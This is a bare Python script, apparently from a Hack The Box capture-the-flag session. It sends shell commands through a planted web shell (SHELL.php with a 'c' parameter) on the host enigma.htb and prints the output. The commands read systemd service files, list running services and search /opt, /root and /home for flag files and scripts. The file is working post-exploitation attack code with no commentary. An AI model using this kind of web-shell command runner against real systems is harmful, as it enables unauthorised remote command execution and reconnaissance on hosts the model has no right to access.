import urllib.request, urllib.parse

cmds = [
    "cat /etc/systemd/system/iptables.service 2>&1",
    "cat /opt/OliveTin/OliveTin-linux-amd64/var/systemd/OliveTin.service 2>&1",
    "systemctl status OliveTin 2>&1 | head -20",
    # Check all services
    "systemctl list-units --type=service --state=running 2>&1 | grep -E 'olive|dovecot|postfix|nginx|mysql|php' | head -20",
    # Check for killswitch or special binary
    "find /opt -name '*.sh' -o -name 'getflag' -o -name 'flag*' 2>/dev/null",
    "find /root -name '*.sh' -o -name 'flag*' 2>/dev/null",
    "find /home -name '*.sh' -o -name 'flag*' 2>/dev/null",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
